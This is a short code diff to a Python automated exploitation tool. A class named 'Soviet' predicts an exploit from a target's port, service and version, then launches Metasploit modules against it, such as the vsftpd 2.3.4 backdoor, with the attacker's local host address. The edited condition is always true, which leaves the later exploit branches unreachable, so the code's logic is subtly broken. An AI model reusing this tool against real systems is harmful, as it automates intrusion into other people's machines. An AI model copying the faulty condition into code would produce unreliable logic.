@@ -102,9 +102,9 @@ class Soviet(predict.Predict):
         print(f"{Color.BLUE}[+] {Color.WHITE}Machine Last Time Boot at => {self.last_boot}")
         print(f"{Color.BLUE}[+] {Color.WHITE}Method Used => \033[1;31m{self.method}\033[0m")
         self.predicted = self.predict(self.PORT, self.STATE, self.SERVICE, self.VERSION)
-        if self.predicted == 'None':
+        if self.predicted != 'None' or self.predicted != None:
             print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
-            sys.exit(23)
+            command.metasploit(self.predicted, self.user, self.lhost()[0])
         elif self.predicted == 'exploit/unix/ftp/vsftpd_234_backdoor':
             print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
             command.ftp(self.predicted, self.user)
@@ -116,7 +116,7 @@ class Soviet(predict.Predict):
             command.igel(self.predicted, self.user, self.lhost()[0], self.lhost()[0])
         else:
             print(f"{Color.BLUE}[+] {Color.WHITE}Exploit Used => {self.predicted}")
-            command.metasploit(self.predicted, self.user, self.lhost()[0])
+            sys.exit(23)
 
 
 if __name__ == '__main__':
